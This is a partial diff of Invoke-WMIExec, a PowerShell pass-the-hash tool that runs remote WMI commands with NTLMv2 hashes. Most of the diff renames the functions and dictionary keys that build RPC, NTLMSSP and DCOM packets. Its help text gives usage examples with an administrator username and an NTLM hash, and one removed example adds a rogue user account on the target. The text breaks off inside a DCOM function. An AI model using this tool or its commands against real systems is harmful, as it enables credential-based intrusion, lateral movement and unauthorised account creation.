@@ -4,6 +4,9 @@ function Invoke-WMIExec
 .SYNOPSIS
 Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.
 
+Author: Kevin Robertson (@kevin_robertson)  
+License: BSD 3-Clause 
+
 .PARAMETER Target
 Hostname or IP address of target.
 
@@ -26,12 +29,11 @@ Default = 10 Milliseconds: Sets the function's Start-Sleep values in millisecond
 setting if you are experiencing strange results.
 
 .EXAMPLE
+Execute a command.
 Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
 
 .EXAMPLE
-Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "cmd.exe /c net user WMIExec Winter2017 /add"
-
-.EXAMPLE
+Check command execution privilege.
 Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
 
 .LINK
@@ -68,126 +70,124 @@ function ConvertFrom-PacketOrderedDictionary
 
 #RPC
 
-function Get-PacketRPCBind()
+function New-PacketRPCBind
 {
     param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)
 
     [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)
 
     $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
-    $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
-    $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
-    $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
-    $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
-    $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
-    $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
-    $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
-    $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
-    $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
-    $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
-    $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
-    $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
-    $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
-    $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
-    $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
-    $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
-    $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
-    $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
-    $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_RPCBind.Add("Version",[Byte[]](0x05))
+    $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
+    $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
+    $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
+    $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
+    $packet_RPCBind.Add("FragLength",[Byte[]](0x48,0x00))
+    $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
+    $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
+    $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
+    $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
+    $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
+    $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
+    $packet_RPCBind.Add("ContextID",$packet_context_ID)
+    $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
+    $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
+    $packet_RPCBind.Add("Interface",$packet_UUID)
+    $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
+    $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
+    $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
+    $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))
 
     if($packet_num_ctx_items[0] -eq 2)
     {
-        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
-        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
-        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
-        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
+        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
+        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
+        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
+        $packet_RPCBind.Add("Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
+        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
     }
     elseif($packet_num_ctx_items[0] -eq 3)
     {
-        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
-        $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
-        $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-        $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
-        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
-        $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
-        $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
-        $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
-        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
-        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
-        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
-        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
+        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
+        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
+        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
+        $packet_RPCBind.Add("Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
+        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
+        $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
+        $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
+        $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
+        $packet_RPCBind.Add("Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
+        $packet_RPCBind.Add("InterfaceVer3",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
+        $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
+        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
+        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x04))
+        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
+        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
+        $packet_RPCBind.Add("ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
+        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
+        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
+        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
     }
 
     if($packet_call_ID -eq 3)
     {
-        $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
-        $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
-        $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
-        $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
-        $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
-        $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-        $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
+        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
+        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
+        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
+        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
+        $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
+        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
+        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
+        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
     }
 
     return $packet_RPCBind
 }
 
-function Get-PacketRPCAUTH3()
+function New-PacketRPCAUTH3
 {
     param([Byte[]]$packet_NTLMSSP)
 
-    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)
-    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0,1]
-    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)
-    $packet_RPC_length = $packet_RPC_length[0,1]
+    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)[0,1]
+    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)[0,1]
 
     $packet_RPCAuth3 = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_RPCAuth3.Add("RPCAUTH3_Version",[Byte[]](0x05))
-    $packet_RPCAuth3.Add("RPCAUTH3_VersionMinor",[Byte[]](0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_PacketType",[Byte[]](0x10))
-    $packet_RPCAuth3.Add("RPCAUTH3_PacketFlags",[Byte[]](0x03))
-    $packet_RPCAuth3.Add("RPCAUTH3_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_FragLength",$packet_RPC_length)
-    $packet_RPCAuth3.Add("RPCAUTH3_AuthLength",$packet_NTLMSSP_length)
-    $packet_RPCAuth3.Add("RPCAUTH3_CallID",[Byte[]](0x03,0x00,0x00,0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_MaxXmitFrag",[Byte[]](0xd0,0x16))
-    $packet_RPCAuth3.Add("RPCAUTH3_MaxRecvFrag",[Byte[]](0xd0,0x16))
-    $packet_RPCAuth3.Add("RPCAUTH3_AuthType",[Byte[]](0x0a))
-    $packet_RPCAuth3.Add("RPCAUTH3_AuthLevel",[Byte[]](0x02))
-    $packet_RPCAuth3.Add("RPCAUTH3_AuthPadLength",[Byte[]](0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_AuthReserved",[Byte[]](0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_ContextID",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_RPCAuth3.Add("RPCAUTH3_NTLMSSP",$packet_NTLMSSP)
+    $packet_RPCAuth3.Add("Version",[Byte[]](0x05))
+    $packet_RPCAuth3.Add("VersionMinor",[Byte[]](0x00))
+    $packet_RPCAuth3.Add("PacketType",[Byte[]](0x10))
+    $packet_RPCAuth3.Add("PacketFlags",[Byte[]](0x03))
+    $packet_RPCAuth3.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
+    $packet_RPCAuth3.Add("FragLength",$packet_RPC_length)
+    $packet_RPCAuth3.Add("AuthLength",$packet_NTLMSSP_length)
+    $packet_RPCAuth3.Add("CallID",[Byte[]](0x03,0x00,0x00,0x00))
+    $packet_RPCAuth3.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
+    $packet_RPCAuth3.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
+    $packet_RPCAuth3.Add("AuthType",[Byte[]](0x0a))
+    $packet_RPCAuth3.Add("AuthLevel",[Byte[]](0x02))
+    $packet_RPCAuth3.Add("AuthPadLength",[Byte[]](0x00))
+    $packet_RPCAuth3.Add("AuthReserved",[Byte[]](0x00))
+    $packet_RPCAuth3.Add("ContextID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_RPCAuth3.Add("NTLMSSP",$packet_NTLMSSP)
 
     return $packet_RPCAuth3
 }
 
-function Get-PacketRPCRequest()
+function New-PacketRPCRequest
 {
     param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)
 
@@ -199,61 +199,60 @@ function Get-PacketRPCRequest()
     [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
     [Byte[]]$packet_frag_length = $packet_write_length[0,1]
     [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
-    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
-    $packet_auth_length = $packet_auth_length[0,1]
+    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)[0,1]
 
     $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
-    $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
-    $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
-    $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
-    $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
-    $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
-    $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
-    $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
-    $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
-    $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
-    $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)
+    $packet_RPCRequest.Add("Version",[Byte[]](0x05))
+    $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
+    $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
+    $packet_RPCRequest.Add("PacketFlags",$packet_flags)
+    $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
+    $packet_RPCRequest.Add("FragLength",$packet_frag_length)
+    $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
+    $packet_RPCRequest.Add("CallID",$packet_call_ID)
+    $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
+    $packet_RPCRequest.Add("ContextID",$packet_context_ID)
+    $packet_RPCRequest.Add("Opnum",$packet_opnum)
 
     if($packet_data.Length)
     {
-        $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
+        $packet_RPCRequest.Add("Data",$packet_data)
     }
 
     return $packet_RPCRequest
 }
 
-function Get-PacketRPCAlterContext()
+function New-PacketRPCAlterContext
 {
     param([Byte[]]$packet_assoc_group,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_interface_UUID)
 
     $packet_RPCAlterContext = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_RPCAlterContext.Add("RPCAlterContext_Version",[Byte[]](0x05))
-    $packet_RPCAlterContext.Add("RPCAlterContext_VersionMinor",[Byte[]](0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_PacketType",[Byte[]](0x0e))
-    $packet_RPCAlterContext.Add("RPCAlterContext_PacketFlags",[Byte[]](0x03))
-    $packet_RPCAlterContext.Add("RPCAlterContext_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_FragLength",[Byte[]](0x48,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_AuthLength",[Byte[]](0x00,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_CallID",$packet_call_ID)
-    $packet_RPCAlterContext.Add("RPCAlterContext_MaxXmitFrag",[Byte[]](0xd0,0x16))
-    $packet_RPCAlterContext.Add("RPCAlterContext_MaxRecvFrag",[Byte[]](0xd0,0x16))
-    $packet_RPCAlterContext.Add("RPCAlterContext_AssocGroup",$packet_assoc_group)
-    $packet_RPCAlterContext.Add("RPCAlterContext_NumCtxItems",[Byte[]](0x01))
-    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown",[Byte[]](0x00,0x00,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_ContextID",$packet_context_ID)
-    $packet_RPCAlterContext.Add("RPCAlterContext_NumTransItems",[Byte[]](0x01))
-    $packet_RPCAlterContext.Add("RPCAlterContext_Unknown2",[Byte[]](0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_Interface",$packet_interface_UUID)
-    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVer",[Byte[]](0x00,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVerMinor",[Byte[]](0x00,0x00))
-    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
-    $packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))
+    $packet_RPCAlterContext.Add("Version",[Byte[]](0x05))
+    $packet_RPCAlterContext.Add("VersionMinor",[Byte[]](0x00))
+    $packet_RPCAlterContext.Add("PacketType",[Byte[]](0x0e))
+    $packet_RPCAlterContext.Add("PacketFlags",[Byte[]](0x03))
+    $packet_RPCAlterContext.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
+    $packet_RPCAlterContext.Add("FragLength",[Byte[]](0x48,0x00))
+    $packet_RPCAlterContext.Add("AuthLength",[Byte[]](0x00,0x00))
+    $packet_RPCAlterContext.Add("CallID",$packet_call_ID)
+    $packet_RPCAlterContext.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
+    $packet_RPCAlterContext.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
+    $packet_RPCAlterContext.Add("AssocGroup",$packet_assoc_group)
+    $packet_RPCAlterContext.Add("NumCtxItems",[Byte[]](0x01))
+    $packet_RPCAlterContext.Add("Unknown",[Byte[]](0x00,0x00,0x00))
+    $packet_RPCAlterContext.Add("ContextID",$packet_context_ID)
+    $packet_RPCAlterContext.Add("NumTransItems",[Byte[]](0x01))
+    $packet_RPCAlterContext.Add("Unknown2",[Byte[]](0x00))
+    $packet_RPCAlterContext.Add("Interface",$packet_interface_UUID)
+    $packet_RPCAlterContext.Add("InterfaceVer",[Byte[]](0x00,0x00))
+    $packet_RPCAlterContext.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
+    $packet_RPCAlterContext.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
+    $packet_RPCAlterContext.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))
 
     return $packet_RPCAlterContext
 }
 
-function Get-PacketNTLMSSPVerifier()
+function New-PacketNTLMSSPVerifier
 {
     param([Int]$packet_auth_padding,[Byte[]]$packet_auth_level,[Byte[]]$packet_sequence_number)
 
@@ -261,17 +260,17 @@ function Get-PacketNTLMSSPVerifier()
 
     if($packet_auth_padding -eq 4)
     {
-        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
+        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
         [Byte[]]$packet_auth_pad_length = 0x04
     }
     elseif($packet_auth_padding -eq 8)
     {
-        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
         [Byte[]]$packet_auth_pad_length = 0x08
     }
     elseif($packet_auth_padding -eq 12)
     {
-        $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
         [Byte[]]$packet_auth_pad_length = 0x0c
     }
     else
@@ -279,62 +278,62 @@ function Get-PacketNTLMSSPVerifier()
         [Byte[]]$packet_auth_pad_length = 0x00
     }
 
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthType",[Byte[]](0x0a))
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthLevel",$packet_auth_level)
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadLen",$packet_auth_pad_length)
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthReserved",[Byte[]](0x00))
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
-    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber",$packet_sequence_number)
+    $packet_NTLMSSPVerifier.Add("AuthType",[Byte[]](0x0a))
+    $packet_NTLMSSPVerifier.Add("AuthLevel",$packet_auth_level)
+    $packet_NTLMSSPVerifier.Add("AuthPadLen",$packet_auth_pad_length)
+    $packet_NTLMSSPVerifier.Add("AuthReserved",[Byte[]](0x00))
+    $packet_NTLMSSPVerifier.Add("AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
+    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
+    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
+    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierSequenceNumber",$packet_sequence_number)
 
     return $packet_NTLMSSPVerifier
 }
 
-function Get-PacketDCOMRemQueryInterface()
+function New-PacketDCOMRemQueryInterface
 {
     param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IID)
 
     $packet_DCOMRemQueryInterface = New-Object System.Collections.Specialized.OrderedDictionary
-    $packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMajor",[Byte[]](0x05,0x00))
